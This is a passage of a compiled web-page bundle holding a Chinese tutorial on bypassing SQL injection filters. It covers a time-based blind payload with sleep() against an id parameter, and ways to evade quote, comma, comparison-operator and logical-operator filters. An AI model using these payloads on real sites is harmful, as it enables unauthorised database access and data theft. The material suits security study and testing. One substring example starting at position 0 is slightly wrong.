</code></pre></div><p>这种过滤方法常常用于 time based 盲注，例如：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">and</span><span class="token punctuation">(</span>sleep<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token punctuation">;</span>
</code></pre></div>`,104),u=s("div",{class:"custom-container info"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"INFO"),s("p",null,"from for 属于逗号绕过。")],-1),k=a(`<h3 id="引号绕过" tabindex="-1"><a class="header-anchor" href="#引号绕过" aria-hidden="true">#</a> 引号绕过</h3><p>会使用到引号的地方一般是在最后的<code>where</code>子句中。如下面的一条 sql 语句，这条语句就是一个简单的用来查选得到 users 表中所有字段的一条语句：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">&quot;users&quot;</span><span class="token punctuation">;</span>
</code></pre></div><p>这个时候如果引号被过滤了，那么上面的 where 子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。</p><p>users 的十六进制的字符串是 7573657273。那么最后的 sql 语句就变为了：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="逗号绕过" tabindex="-1"><a class="header-anchor" href="#逗号绕过" aria-hidden="true">#</a> 逗号绕过</h3><p>在使用盲注的时候，需要使用到<code>substr()</code>,<code>mid()</code>,<code>limit</code>。这些子句方法都需要使用到逗号。对于 substr() 和 mid() 这两个方法可以使用 <code>from for</code>的方式来解决：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div>`,9),r=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"TIP"),s("p",null,"from for"),s("p",null,"语法："),s("div",{class:"language-sql","data-ext":"sql"},[s("pre",{class:"language-sql"},[s("code",null,[n("SUBSTRING"),s("span",{class:"token punctuation"},"("),n("str "),s("span",{class:"token keyword"},"FROM"),n(" pos "),s("span",{class:"token keyword"},"FOR"),n(" len"),s("span",{class:"token punctuation"},")"),s("span",{class:"token punctuation"},";"),n(`
`)])])]),s("ul",null,[s("li",null,"str 是将从其返回子字符串的字符串。"),s("li",null,"Pos 是子字符串的起始位置。"),s("li",null,"Len 是子字符串的长度，即从 str 提取的字符总数。")]),s("p",null,"示例："),s("div",{class:"language-sql","data-ext":"sql"},[s("pre",{class:"language-sql"},[s("code",null,[n("mysql"),s("span",{class:"token operator"},">"),n(),s("span",{class:"token keyword"},"Select"),n(" SUBSTRING"),s("span",{class:"token punctuation"},"("),s("span",{class:"token string"},"'foobarbar'"),n(),s("span",{class:"token keyword"},"FROM"),n(),s("span",{class:"token number"},"4"),n(),s("span",{class:"token keyword"},"FOR"),n(),s("span",{class:"token number"},"5"),s("span",{class:"token punctuation"},")"),s("span",{class:"token punctuation"},";"),n(`
`),s("span",{class:"token operator"},"+"),s("span",{class:"token comment"},"-------------------------------------+"),n(`
`),s("span",{class:"token operator"},"|"),n(" SUBSTRING"),s("span",{class:"token punctuation"},"("),s("span",{class:"token string"},"'foobarbar'"),n(),s("span",{class:"token keyword"},"FROM"),n(),s("span",{class:"token number"},"4"),n(),s("span",{class:"token keyword"},"FOR"),n(),s("span",{class:"token number"},"5"),s("span",{class:"token punctuation"},")"),n(),s("span",{class:"token operator"},"|"),n(`
`),s("span",{class:"token operator"},"+"),s("span",{class:"token comment"},"-------------------------------------+"),n(`
`),s("span",{class:"token operator"},"|"),n(" barba                               "),s("span",{class:"token operator"},"|"),n(`
`),s("span",{class:"token operator"},"+"),s("span",{class:"token comment"},"-------------------------------------+"),n(`
`),s("span",{class:"token number"},"1"),n(),s("span",{class:"token keyword"},"row"),n(),s("span",{class:"token operator"},"in"),n(),s("span",{class:"token keyword"},"set"),n(),s("span",{class:"token punctuation"},"("),s("span",{class:"token number"},"0.00"),n(" sec"),s("span",{class:"token punctuation"},")"),n(`
`)])])])],-1),i=a(`<p>使用 join：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">;</span>
<span class="token comment"># 等价于</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span>
</code></pre></div><p>使用 like：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">;</span>
<span class="token comment"># 等价于</span>
<span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">&#39;r%&#39;</span><span class="token punctuation">;</span>
</code></pre></div><p>对于<code>limit</code>可以使用 <code>offset</code>来绕过：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment"># 等价于</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="比较绕过" tabindex="-1"><a class="header-anchor" href="#比较绕过" aria-hidden="true">#</a> 比较绕过</h3><p>过滤了<code>&lt;&gt;</code>：sqlmap 盲注经常使用 &lt;&gt;，使用 between 的脚本：同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到 greatest 来进行绕过了。最常见的一个盲注的 sql 语句：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">64</span><span class="token punctuation">;</span>
</code></pre></div><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用<code>greatest</code>来代替比较操作符了。</p>`,10),d=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"TIP"),s("p",null,"GREATEST"),s("div",{class:"language-sql","data-ext":"sql"},[s("pre",{class:"language-sql"},[s("code",null,[n("GREATEST"),s("span",{class:"token punctuation"},"("),n("X1"),s("span",{class:"token punctuation"},","),n(" X2"),s("span",{class:"token punctuation"},","),n(" X3"),s("span",{class:"token punctuation"},","),n(),s("span",{class:"token punctuation"},"."),s("span",{class:"token punctuation"},"."),s("span",{class:"token punctuation"},"."),s("span",{class:"token punctuation"},")"),s("span",{class:"token punctuation"},";"),n(`
`)])])]),s("p",null,"该方法接受语法中的 N 个参数，它返回最大值。")],-1),m=a(`<p>上面的 sql 语句可以变成：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> greatest<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">;</span>
</code></pre></div><p>使用<code>between and</code>。</p><h3 id="符号绕过" tabindex="-1"><a class="header-anchor" href="#符号绕过" aria-hidden="true">#</a> 符号绕过</h3><p>or and xor not绕过：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token operator">and</span><span class="token operator">=</span><span class="token operator">&amp;&amp;</span>  <span class="token operator">or</span><span class="token operator">=</span><span class="token operator">||</span>   <span class="token operator">xor</span><span class="token operator">=</span><span class="token operator">|</span>   <span class="token operator">not</span><span class="token operator">=</span><span class="token operator">!</span> 
</code></pre></div>`,6),g=[l,u,k,r,i,d,m];function w(y,h){return e(),p("div",null,g)}const x=t(c,[["render",w],["__file","SQLI.html.vue"]]);export{x as default};
